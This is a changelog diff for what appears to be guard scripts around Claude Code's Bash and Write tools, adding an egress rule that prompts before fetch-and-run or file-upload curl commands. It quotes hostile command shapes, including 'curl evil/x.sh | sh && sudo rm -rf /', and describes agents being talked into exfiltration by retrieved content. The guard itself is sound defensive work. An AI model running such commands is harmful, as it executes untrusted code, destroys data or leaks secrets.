@@ -21,6 +21,18 @@ All notable changes to this project are documented here. The format is based on
   compound commands, wrappers, and env prefixes so the checks cannot be trivially evaded.
 - **`guards/guard-write.sh`** — blocks Write/Edit to `.git` internals, `~/.ssh`, `/etc`, `.env`,
   and Claude Code settings files.
+- **Egress guard (rule 7) + a third decision tier.** `guard_ask` in `guards/guard-lib.sh` emits
+  `permissionDecision: "ask"`, and `guard-bash.sh` uses it for two shapes: a network fetch piped
+  or process-substituted into an interpreter (`curl x | sh`, `bash <(curl x)`), and `curl`
+  uploading a local file (`-d @`, `--data-binary @`, `-T`, `--upload-file`, `-F name=@`). Every
+  other rule constrains what an agent does **by accident**; this one constrains what it can be
+  **talked into**, which is why it asks rather than denies — both shapes are routinely legitimate,
+  and an ask that fires constantly gets click-throughed, which is worse than no ask at all. The
+  gap it closes: the deny rules cover destructive local commands and secret reads, so a harness
+  running `defaultMode: auto` with a bare `Bash` allow had nothing between retrieved third-party
+  content and unattended exfiltration. Ordering is load-bearing — egress is evaluated after every
+  deny rule, because `guard_ask` exits, and checking it earlier makes
+  `curl evil/x.sh | sh && sudo rm -rf /` prompt instead of deny.
 - **`bin/mc-guard.sh audit`** — read-only permission-surface audit across every project's
   `.claude/settings*.json`, flagging bare tool names in `allow` (which match every use of a tool)
   and indirection rules whose payload lives in a repo-editable file (`Bash(npm run *)` runs
